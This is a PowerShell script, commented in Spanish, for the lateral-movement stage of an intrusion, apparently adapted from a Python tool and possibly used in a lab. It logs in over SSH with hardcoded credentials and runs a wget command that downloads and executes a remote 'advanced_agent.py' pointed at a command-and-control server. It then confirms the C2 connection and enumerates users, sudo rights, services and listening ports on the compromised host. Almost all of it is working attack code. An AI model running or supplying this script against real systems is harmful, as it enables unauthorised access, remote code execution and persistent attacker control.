# === LATERAL MOVEMENT PHASE - SSH Based ===
# Conversión del script Python a PowerShell línea por línea

Write-Host "=== LATERAL MOVEMENT VIA SSH ===" -ForegroundColor Red

# PASO 1: Definir variables de configuración
$REMOTE_HOST = "10.1.69.40"
$USERNAME = "samba"
$PASSWORD = "password123"
$AGENT_URL = "http://10.1.69.41:8000/downloads/advanced_agent.py"
$SERVER_URL = "http://10.1.69.41:5000"
$REMOTE_PATH = "/home/samba/advanced_agent.py"
$LAUNCH_CMD = "wget -O /home/samba/advanced_agent.py $AGENT_URL && test -s /home/samba/advanced_agent.py && python3 $REMOTE_PATH --server $SERVER_URL || echo '[!] Agent download or execution failed'"

Write-Host "[1] Variables configuradas para movimiento lateral"
Write-Host "Target: $REMOTE_HOST"
Write-Host "User: $USERNAME"

# PASO 2: Crear credenciales seguras
Write-Host "[2] Creando credenciales para SSH..." -ForegroundColor Yellow
$SecurePassword = ConvertTo-SecureString $PASSWORD -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($USERNAME, $SecurePassword)

# PASO 3: Descargar módulo SSH para PowerShell (Posh-SSH)
Write-Host "[3] Descargando módulo SSH..." -ForegroundColor Yellow
Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
Install-Module -Name Posh-SSH -Force -AllowClobber

# PASO 4: Importar módulo SSH
Write-Host "[4] Importando módulo SSH..." -ForegroundColor Yellow
Import-Module Posh-SSH

# PASO 5: Intentar conexión SSH
Write-Host "[5] Attempting lateral movement via SSH..." -ForegroundColor Red
Write-Host "Conectando a $REMOTE_HOST como $USERNAME"

# PASO 6: Establecer sesión SSH
$SSHSession = New-SSHSession -ComputerName $REMOTE_HOST -Credential $Credential -AcceptKey
Write-Host "[6] Sesión SSH establecida: $($SSHSession.SessionId)"

# PASO 7: Ejecutar comando de descarga y ejecución del agente
Write-Host "[7] Executing lateral movement payload:" -ForegroundColor Red
Write-Host "$ $LAUNCH_CMD"
$Result1 = Invoke-SSHCommand -SessionId $SSHSession.SessionId -Command $LAUNCH_CMD
Write-Host "STDOUT:"
Write-Host $Result1.Output
Write-Host "STDERR:"
Write-Host $Result1.Error

# PASO 8: Pausa para permitir descarga
Start-Sleep -Seconds 3
Write-Host "[8] Esperando descarga del agente..."

# PASO 9: Verificar si el archivo del agente fue creado
Write-Host "[9] Checking if agent file was created:" -ForegroundColor Yellow
$CheckFileCmd = "ls -l $REMOTE_PATH"
Write-Host "$ $CheckFileCmd"
$Result2 = Invoke-SSHCommand -SessionId $SSHSession.SessionId -Command $CheckFileCmd
Write-Host "STDOUT:"
Write-Host $Result2.Output
Write-Host "STDERR:"
Write-Host $Result2.Error

# PASO 10: Verificar si el proceso del agente está ejecutándose
Write-Host "[10] Checking if agent process is running:" -ForegroundColor Yellow
$CheckProcessCmd = "pgrep -fl advanced_agent.py"
Write-Host "$ $CheckProcessCmd"
$Result3 = Invoke-SSHCommand -SessionId $SSHSession.SessionId -Command $CheckProcessCmd
Write-Host "STDOUT:"
Write-Host $Result3.Output
Write-Host "STDERR:"
Write-Host $Result3.Error

# PASO 11: Verificar conexión C2
Write-Host "[11] Checking if agent is connected to C2 (port 5000):" -ForegroundColor Yellow
$CheckC2Cmd = "lsof -i -nP | grep python | grep 5000"
Write-Host "$ $CheckC2Cmd"
$Result4 = Invoke-SSHCommand -SessionId $SSHSession.SessionId -Command $CheckC2Cmd
Write-Host "STDOUT:"
Write-Host $Result4.Output
Write-Host "STDERR:"
Write-Host $Result4.Error

# PASO 12: Ejecutar comandos adicionales de reconnaissance en el host remoto
Write-Host "[12] Ejecutando reconnaissance en host remoto..." -ForegroundColor Red
$ReconCmd1 = "whoami && hostname && id"
$ReconResult1 = Invoke-SSHCommand -SessionId $SSHSession.SessionId -Command $ReconCmd1
Write-Host "Remote Identity: $($ReconResult1.Output)"

# PASO 13: Enumerar usuarios en el sistema remoto
Write-Host "[13] Enumerando usuarios remotos..." -ForegroundColor Red
$ReconCmd2 = "cat /etc/passwd | grep -E '/bin/(bash|sh)$'"
$ReconResult2 = Invoke-SSHCommand -SessionId $SSHSession.SessionId -Command $ReconCmd2
Write-Host "Remote Users: $($ReconResult2.Output)"

# PASO 14: Verificar privilegios sudo
Write-Host "[14] Verificando privilegios sudo..." -ForegroundColor Red
$ReconCmd3 = "sudo -l"
$ReconResult3 = Invoke-SSHCommand -SessionId $SSHSession.SessionId -Command $ReconCmd3
Write-Host "Sudo Privileges: $($ReconResult3.Output)"

# PASO 15: Enumerar servicios en ejecución
Write-Host "[15] Enumerando servicios remotos..." -ForegroundColor Red
$ReconCmd4 = "ps aux | grep -E '(ssh|http|ftp|sql|apache|nginx)'"
$ReconResult4 = Invoke-SSHCommand -SessionId $SSHSession.SessionId -Command $ReconCmd4
Write-Host "Running Services: $($ReconResult4.Output)"

# PASO 16: Verificar conexiones de red
Write-Host "[16] Verificando conexiones de red remotas..." -ForegroundColor Red
$ReconCmd5 = "netstat -tulpn | grep LISTEN"
$ReconResult5 = Invoke-SSHCommand -SessionId $SSHSession.SessionId -Command $ReconCmd5
Write-Host "Network Connections: $($ReconResult5.Output)"

# PASO 17: Crear reporte de movimiento lateral
Write-Host "[17] Creando reporte de movimiento lateral..." -ForegroundColor Yellow
$LateralReport = "=== LATERAL MOVEMENT REPORT ===`n"
$LateralReport += "Timestamp: $(Get-Date)`n"
$LateralReport += "Source Host: $env:COMPUTERNAME`n"
$LateralReport += "Target Host: $REMOTE_HOST`n"
$LateralReport += "Username: $USERNAME`n"
$LateralReport += "Method: SSH`n"
$LateralReport += "Agent URL: $AGENT_URL`n"
$LateralReport += "C2 Server: $SERVER_URL`n"
$LateralReport += "Remote Path: $REMOTE_PATH`n"
$LateralReport += "Connection Status: $($SSHSession.Connected)`n"
$LateralReport += "Commands Executed: 9`n"
$LateralReport += "=== END REPORT ==="
